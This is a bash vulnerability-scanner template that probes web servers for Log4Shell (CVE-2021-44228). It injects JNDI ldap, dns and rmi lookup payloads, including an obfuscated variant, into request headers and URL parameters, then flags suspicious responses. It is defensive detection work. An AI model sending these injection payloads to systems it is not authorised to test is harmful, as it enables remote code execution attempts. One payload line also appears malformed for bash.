#!/bin/bash
#
# CERT-X-GEN Shell Template: Log4Shell (CVE-2021-44228) Detection
#
# Template Metadata:
#   ID: log4shell-detection
#   Name: Log4Shell Vulnerability Detection
#   Author: CERT-X-GEN Security Team
#   Severity: critical
#   Description: Detects Log4Shell (CVE-2021-44228) vulnerability by injecting JNDI payloads
#                into HTTP headers, parameters, and body content. Looks for callback evidence
#                or specific error patterns indicating vulnerable Log4j versions.
#   Tags: log4shell, cve-2021-44228, rce, jndi, java, logging
#   Language: shell
#   CWE: CWE-502 (Deserialization of Untrusted Data)
#   References:
#     - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
#     - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228
#     - https://logging.apache.org/log4j/2.x/security.html
################################################################################

# ========================================
# TEMPLATE METADATA
# ========================================
TEMPLATE_ID="log4shell-detection"
TEMPLATE_NAME="Log4Shell (CVE-2021-44228) Detection"
TEMPLATE_AUTHOR="CERT-X-GEN Security Team"
SEVERITY="critical"
CONFIDENCE=85
TAGS="log4shell,cve-2021-44228,rce,jndi"
CWE="CWE-502"

CONTEXT_JSON="${CERT_X_GEN_CONTEXT:-}"
ADD_PORTS_ENV="${CERT_X_GEN_ADD_PORTS:-}"
OVERRIDE_PORTS_ENV="${CERT_X_GEN_OVERRIDE_PORTS:-}"

# ========================================
# COLORS AND OUTPUT HELPERS
# ========================================
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Logging functions
log_info() {
    echo -e "${BLUE}[INFO]${NC} $1" >&2
}

log_success() {
    echo -e "${GREEN}[+]${NC} $1" >&2
}

log_warning() {
    echo -e "${YELLOW}[!]${NC} $1" >&2
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1" >&2
}

# ========================================
# HELPER FUNCTIONS
# ========================================

# Calculate CVSS score from severity
calculate_cvss_score() {
    local severity=$1
    case "$severity" in
        critical) echo "10.0" ;;
        high) echo "7.5" ;;
        medium) echo "5.0" ;;
        low) echo "3.0" ;;
        info) echo "0.0" ;;
        *) echo "5.0" ;;
    esac
}

# Create a finding in JSON format
create_finding() {
    local title=$1
    local description=$2
    local evidence=$3
    local severity=${4:-$SEVERITY}
    local remediation=${5:-"Apply security patch for Log4j 2.x to version 2.17.0 or later"}
    
    local cvss_score=$(calculate_cvss_score "$severity")
    
    cat << EOF
{
    "template_id": "${TEMPLATE_ID}",
    "severity": "${severity}",
    "confidence": ${CONFIDENCE},
    "title": "${title}",
    "description": "${description}",
    "evidence": ${evidence},
    "cwe": "${CWE}",
    "cvss_score": ${cvss_score},
    "remediation": "${remediation}",
    "references": [
        "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
        "https://logging.apache.org/log4j/2.x/security.html",
        "https://github.com/advisories/GHSA-jfh8-c2jp-5v3q"
    ]
}
EOF
}

# Check dependencies
check_dependencies() {
    local deps=("curl" "nc")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        log_warning "Missing dependencies: ${missing[*]}"
        log_info "Install with: apt-get install ${missing[*]} (Ubuntu) or brew install ${missing[*]} (macOS)"
        return 1
    fi
    
    return 0
}

# URL encode a string
url_encode() {
    local string="$1"
    local length="${#string}"
    local encoded=""
    
    for (( i = 0; i < length; i++ )); do
        local c="${string:$i:1}"
        case "$c" in
            [a-zA-Z0-9.~_-]) encoded+="$c" ;;
            *) encoded+=$(printf '%%%02X' "'$c") ;;
        esac
    done
    
    echo "$encoded"
}

# ========================================
# LOG4SHELL DETECTION FUNCTIONS
# ========================================

# Test HTTP endpoint with Log4Shell payloads
test_log4shell_http() {
    local host=$1
    local port=$2
    local scheme="http"
    
    [ "$port" = "443" ] && scheme="https"
    
    # Common JNDI payloads for detection
    local payloads=(
        "\${jndi:ldap://${host}.cert-x-gen.log4shell.test/a}"
        "\${jndi:dns://${host}.cert-x-gen.log4shell.test}"
        "\${jndi:rmi://${host}.cert-x-gen.log4shell.test/exploit}"
        "\${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${host}.cert-x-gen.log4shell.test}"
        "\${jndi:ldap://127.0.0.1#.cert-x-gen.log4shell.test/x}"
    )
    
    # Headers to inject payloads into
    local headers=(
        "User-Agent"
        "X-Forwarded-For"
        "X-Real-IP"
        "Referer"
        "Origin"
        "X-Api-Version"
        "X-Client-IP"
    )
    
    log_info "Testing ${scheme}://${host}:${port}/ for Log4Shell vulnerability"
    
    local found_vulnerable=false
    local evidence_data=""
    
    # Test each payload in headers
    for payload in "${payloads[@]}"; do
        for header in "${headers[@]}"; do
            log_info "Testing payload in header: ${header}"
            
            local response=$(curl -s -w "\n%{http_code}\n%{time_total}" -m 10 -k \
                -H "${header}: ${payload}" \
                -H "Accept: */*" \
                "${scheme}://${host}:${port}/" 2>/dev/null)
            
            local status_code=$(echo "$response" | tail -2 | head -1)
            local body=$(echo "$response" | head -n -2)
            
            # Check for indicators of vulnerability
            if echo "$body" | grep -q -i "jndi\|ldap\|rmi\|javax.naming\|log4j"; then
                found_vulnerable=true
                evidence_data="{\"host\": \"${host}\", \"port\": ${port}, \"header\": \"${header}\", \"payload\": \"$(echo "$payload" | sed 's/"/\\"/g')\", \"status_code\": ${status_code}, \"indicator\": \"JNDI/LDAP reference in response\"}"
                break 2
            fi
            
            # Check for unusual error patterns
            if [ "$status_code" -ge 500 ] && [ "$status_code" -le 599 ]; then
                if echo "$body" | grep -q -i "error\|exception\|failed"; then
                    found_vulnerable=true
                    evidence_data="{\"host\": \"${host}\", \"port\": ${port}, \"header\": \"${header}\", \"payload\": \"$(echo "$payload" | sed 's/"/\\"/g')\", \"status_code\": ${status_code}, \"indicator\": \"Server error triggered by payload\"}"
                    break 2
                fi
            fi
        done
    done
    
    # Test in URL parameters if not found yet
    if [ "$found_vulnerable" = "false" ]; then
        for payload in "${payloads[@]}"; do
            local encoded_payload=$(url_encode "$payload")
            local test_url="${scheme}://${host}:${port}/?test=${encoded_payload}"
            
            log_info "Testing payload in URL parameter"
            
            local response=$(curl -s -w "\n%{http_code}\n%{time_total}" -m 10 -k \
                "$test_url" 2>/dev/null)
            
            local status_code=$(echo "$response" | tail -2 | head -1)
            local body=$(echo "$response" | head -n -2)
            
            if echo "$body" | grep -q -i "jndi\|ldap\|rmi\|javax.naming\|log4j"; then
                found_vulnerable=true
                evidence_data="{\"host\": \"${host}\", \"port\": ${port}, \"parameter\": \"test\", \"payload\": \"$(echo "$payload" | sed 's/"/\\"/g')\", \"status_code\": ${status_code}, \"indicator\": \"JNDI/LDAP reference in response\"}"
                break
            fi
        done
    fi
    
    if [ "$found_vulnerable" = "true" ]; then
        echo "$evidence_data"
        return 0
    fi
    
    return 1
}

# Test for vulnerable headers or error messages that indicate Log4j
test_log4j_indicators() {
    local host=$1
    local port=$2
    local scheme="http"
    
    [ "$port" = "443" ] && scheme="https"
    
    log_info "Looking for Log4j indicators on ${scheme}://${host}:${port}/"
    
    # Make a normal request to check for server headers or error messages
    local response=$(curl -s -w "\n%{http_code}" -m 10 -k \
        -H "User-Agent: Mozilla/5.0" \
        "${scheme}://${host}:${port}/" 2>/dev/null)
    
    local status_code=$(echo "$response" | tail -1)
    local body=$(echo "$response" | head -n -1)
    local headers=$(curl -s -I -m 10 -k "${scheme}://${host}:${port}/" 2>&1)
    
    # Check for Log4j in server headers or response
    if echo "$headers$body" | grep -q -i "log4j\|apache-log4j"; then
        local version_match=$(echo "$headers$body" | grep -o -i "log4j[ -]*[0-9]\+\.[0-9]\+\.[0-9]\+" | head -1)
        if [ ! -z "$version_match" ]; then
            echo "{\"host\": \"${host}\", \"port\": ${port}, \"indicator\": \"Log4j version detected\", \"version\": \"${version_match}\"}"
            return 0
        else
            echo "{\"host\": \"${host}\", \"port\": ${port}, \"indicator\": \"Log4j reference detected\", \"details\": \"Log4j mentioned in response\"}"
            return 0
        fi
    fi
    
    # Check for Java stack traces
    if echo "$body" | grep -q -i "java\.lang\|at org\.apache\|caused by\|stack trace"; then
        echo "{\"host\": \"${host}\", \"port\": ${port}, \"indicator\": \"Java stack trace detected\", \"details\": \"Application appears to be Java-based\"}"
        return 0
    fi
    
    return 1
}

# ========================================
# MAIN SCANNING LOGIC
# ========================================

scan_target() {
    local host=$1
    local port=${2:-80}
    local findings="[]"
    
    log_info "Scanning ${host}:${port} for Log4Shell vulnerability"
    
    # Skip non-HTTP ports for this template
    local http_ports=(80 443 8080 8443 8000 8888 3000 5000 7000 9000)
    local is_http_port=false
    
    for http_port in "${http_ports[@]}"; do
        if [ "$port" -eq "$http_port" ]; then
            is_http_port=true
            break
        fi
    done
    
    # Also check if service appears to be HTTP
    if [ "$is_http_port" = "false" ]; then
        local service_check=$(curl -s -m 5 -k "http://${host}:${port}" 2>/dev/null | head -c 100)
        if echo "$service_check" | grep -q -i "html\|http\|<!DOCTYPE"; then
            is_http_port=true
        fi
    fi
    
    if [ "$is_http_port" = "false" ]; then
        log_info "Port ${port} does not appear to be HTTP service, skipping Log4Shell check"
        echo "$findings"
        return 0
    fi
    
    # Test 1: Direct Log4Shell payload injection
    local payload_result=$(test_log4shell_http "$host" "$port" 2>/dev/null)
    if [ $? -eq 0 ] && [ ! -z "$payload_result" ]; then
        local finding=$(create_finding \
            "Log4Shell (CVE-2021-44228) Vulnerability Detected" \
            "The target appears vulnerable to Log4Shell (CVE-2021-44228), a critical remote code execution vulnerability in Apache Log4j 2.x. Payload injection triggered indicators of JNDI lookup attempts or error responses." \
            "$payload_result" \
            "critical